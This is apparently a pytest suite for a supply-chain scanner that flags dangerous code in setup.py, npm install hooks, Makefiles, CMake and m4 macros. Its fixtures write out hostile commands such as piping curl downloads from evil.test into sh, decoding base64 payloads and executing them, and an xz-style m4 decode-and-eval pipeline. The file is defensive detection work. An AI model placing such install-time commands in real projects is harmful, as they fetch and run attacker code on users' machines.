"""Tests for Module D -- what happens during build and install.

Code that runs at install time runs without anyone calling it, on machines whose
owners never read it. That is why `setup.py` and `postinstall` are the most
attacked files in the ecosystem, and why the phase context matters: `subprocess`
in application code is ordinary, and `subprocess` in an install hook is not.
"""

import json
from pathlib import Path

import pytest

from forensic_scan.discovery.classify import classify_file
from forensic_scan.engine.build_inspector import BuildInspector
from forensic_scan.models import SignalKind


@pytest.fixture
def inspector():
    return BuildInspector()


def _run(inspector, tmp_path: Path, name: str, content: bytes):
    p = tmp_path / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(content)
    return inspector.analyze(classify_file(p), content)


def _kinds(signals):
    return {s.kind for s in signals}


def _of(signals, kind):
    return [s for s in signals if s.kind is kind]


class TestPythonSetup:
    def test_detects_shell_execution_in_setup_py(self, inspector, tmp_path):
        src = b"""from setuptools import setup
import subprocess
subprocess.check_call("curl http://evil.test/x | sh", shell=True)
setup(name="pkg")
"""
        assert SignalKind.BUILD_SHELL_EXEC in _kinds(_run(inspector, tmp_path, "setup.py", src))

    def test_detects_network_access_in_setup_py(self, inspector, tmp_path):
        src = b"""import urllib.request
urllib.request.urlopen("http://example.test/payload")
"""
        assert SignalKind.BUILD_NETWORK_ACCESS in _kinds(_run(inspector, tmp_path, "setup.py", src))

    def test_detects_decompression_in_setup_py(self, inspector, tmp_path):
        src = b"import lzma\ndata = lzma.decompress(open('tests/fixture.bin','rb').read())\n"
        assert SignalKind.BUILD_DECOMPRESSION in _kinds(_run(inspector, tmp_path, "setup.py", src))

    def test_records_referenced_file_paths(self, inspector, tmp_path):
        src = b"data = open('tests/fixtures/payload.dat', 'rb').read()\n"
        refs = _of(_run(inspector, tmp_path, "setup.py", src), SignalKind.BUILD_FILE_REFERENCE)
        assert "tests/fixtures/payload.dat" in {s.metadata["path"] for s in refs}

    def test_an_ordinary_setup_py_is_quiet(self, inspector, tmp_path):
        src = b"""from setuptools import setup, find_packages

setup(
    name="mypackage",
    version="1.0.0",
    packages=find_packages(),
    install_requires=["requests>=2.0"],
)
"""
        assert _run(inspector, tmp_path, "setup.py", src) == []

    def test_application_code_is_not_inspected_as_a_build_file(self, inspector, tmp_path):
        src = b"import subprocess\nsubprocess.run(['ls'])\n"
        assert _run(inspector, tmp_path, "src/app.py", src) == []


class TestNpmManifest:
    def _pkg(self, scripts):
        return json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts}).encode()

    def test_detects_a_network_pipe_to_shell_in_postinstall(self, inspector, tmp_path):
        content = self._pkg({"postinstall": "curl -s http://evil.test/i.sh | bash"})
        signals = _run(inspector, tmp_path, "package.json", content)
        assert SignalKind.BUILD_NETWORK_ACCESS in _kinds(signals)
        assert SignalKind.BUILD_SHELL_EXEC in _kinds(signals)

    def test_names_the_lifecycle_hook(self, inspector, tmp_path):
        content = self._pkg({"preinstall": "wget http://evil.test/x"})
        sig = _of(
            _run(inspector, tmp_path, "package.json", content),
            SignalKind.BUILD_NETWORK_ACCESS,
        )[0]
        assert sig.metadata["hook"] == "preinstall"

    def test_detects_node_eval_in_an_install_hook(self, inspector, tmp_path):
        content = self._pkg({"install": "node -e \"require('child_process').exec('x')\""})
        assert SignalKind.BUILD_SHELL_EXEC in _kinds(
            _run(inspector, tmp_path, "package.json", content)
        )

    def test_detects_base64_decoding_in_an_install_hook(self, inspector, tmp_path):
        content = self._pkg({"postinstall": "echo aGk= | base64 -d > /tmp/x && sh /tmp/x"})
        assert SignalKind.BUILD_DECOMPRESSION in _kinds(
            _run(inspector, tmp_path, "package.json", content)
        )

    def test_a_build_script_is_not_an_install_hook(self, inspector, tmp_path):
        """`npm run build` is explicit. Only hooks that run automatically count."""
        content = self._pkg({"build": "webpack --mode production", "test": "jest"})
        assert _run(inspector, tmp_path, "package.json", content) == []

    def test_an_ordinary_lifecycle_hook_is_quiet(self, inspector, tmp_path):
        content = self._pkg({"prepare": "husky install"})
        assert _run(inspector, tmp_path, "package.json", content) == []

    def test_malformed_json_does_not_raise(self, inspector, tmp_path):
        assert _run(inspector, tmp_path, "package.json", b"{not json") == []


class TestPostinstallScript:
    def test_detects_dynamic_execution_in_a_postinstall_script(self, inspector, tmp_path):
        src = b"""const raw = "bG9uZyBiYXNlNjQgcGF5bG9hZCBzdHJpbmcgZm9yIHRlc3Rpbmc=";
new Function(Buffer.from(raw, 'base64').toString())();
"""
        signals = _run(inspector, tmp_path, "scripts/postinstall.js", src)
        assert SignalKind.BUILD_SHELL_EXEC in _kinds(signals)

    def test_detects_network_access_in_a_postinstall_script(self, inspector, tmp_path):
        src = b"const https = require('https');\nhttps.get('http://evil.test/p');\n"
        assert SignalKind.BUILD_NETWORK_ACCESS in _kinds(
            _run(inspector, tmp_path, "scripts/postinstall.js", src)
        )


class TestMakefile:
    def test_detects_a_download_in_a_recipe(self, inspector, tmp_path):
        src = b"all:\n\tcurl -o payload.bin http://evil.test/p\n\t./payload.bin\n"
        assert SignalKind.BUILD_NETWORK_ACCESS in _kinds(_run(inspector, tmp_path, "Makefile", src))

    def test_detects_decoding_in_a_recipe(self, inspector, tmp_path):
        src = b"all:\n\txz -dc tests/fixture.xz | sh\n"
        signals = _run(inspector, tmp_path, "Makefile", src)
        assert SignalKind.BUILD_DECOMPRESSION in _kinds(signals)

    def test_an_ordinary_makefile_is_quiet(self, inspector, tmp_path):
        src = b"CC=gcc\nall: main.o\n\t$(CC) -o app main.o\n\nclean:\n\trm -f *.o app\n"
        assert _run(inspector, tmp_path, "Makefile", src) == []


class TestCMake:
    def test_detects_execute_process(self, inspector, tmp_path):
        src = b'execute_process(COMMAND sh -c "curl http://evil.test | sh")\n'
        assert SignalKind.BUILD_SHELL_EXEC in _kinds(
            _run(inspector, tmp_path, "CMakeLists.txt", src)
        )

    def test_detects_file_download(self, inspector, tmp_path):
        src = b'file(DOWNLOAD "http://evil.test/p" "${CMAKE_BINARY_DIR}/p")\n'
        assert SignalKind.BUILD_NETWORK_ACCESS in _kinds(
            _run(inspector, tmp_path, "CMakeLists.txt", src)
        )

    def test_an_ordinary_cmakelists_is_quiet(self, inspector, tmp_path):
        src = b"cmake_minimum_required(VERSION 3.10)\nproject(app)\nadd_executable(app main.c)\n"
        assert _run(inspector, tmp_path, "CMakeLists.txt", src) == []


class TestAutoconfAndM4:
    def test_detects_the_xz_style_m4_decode_pipeline(self, inspector, tmp_path):
        """The shape of build-to-host.m4: a test fixture piped through a byte
        substitution into the build."""
        src = b"""AC_DEFUN([gl_BUILD_TO_HOST], [
  gl_path=`echo $srcdir/tests/files/bad-3-corrupt_lzma2.xz | tr "\\t \\-_" " \\t_\\-"`
  eval `sed "s/dnl//g" $gl_path | xz -dc`
])
"""
        signals = _run(inspector, tmp_path, "m4/build-to-host.m4", src)
        assert SignalKind.BUILD_MACRO_ANOMALY in _kinds(signals)
        assert SignalKind.BUILD_DECOMPRESSION in _kinds(signals)

    def test_records_the_fixture_path_the_macro_reaches_for(self, inspector, tmp_path):
        src = b"gl_path=$srcdir/tests/files/bad-3-corrupt_lzma2.xz\n"
        refs = _of(_run(inspector, tmp_path, "m4/build.m4", src), SignalKind.BUILD_FILE_REFERENCE)
        assert any("bad-3-corrupt_lzma2.xz" in s.metadata["path"] for s in refs)

    def test_an_ordinary_m4_macro_is_quiet(self, inspector, tmp_path):
        src = b"AC_DEFUN([AX_CHECK_LIB], [\n  AC_CHECK_LIB([m], [cos])\n])\n"
        assert _run(inspector, tmp_path, "m4/checks.m4", src) == []

    def test_detects_eval_in_configure_ac(self, inspector, tmp_path):
        src = b'AC_INIT([app], [1.0])\neval `cat tests/data.bin | tr "A-Za-z" "N-ZA-Mn-za-m"`\n'
        assert SignalKind.BUILD_MACRO_ANOMALY in _kinds(
            _run(inspector, tmp_path, "configure.ac", src)
        )


class TestRobustness:
    def test_an_empty_build_file_yields_nothing(self, inspector, tmp_path):
        assert _run(inspector, tmp_path, "setup.py", b"") == []

    def test_undecodable_bytes_do_not_raise(self, inspector, tmp_path):
        _run(inspector, tmp_path, "Makefile", b"\xff\xfe\x00binary garbage")
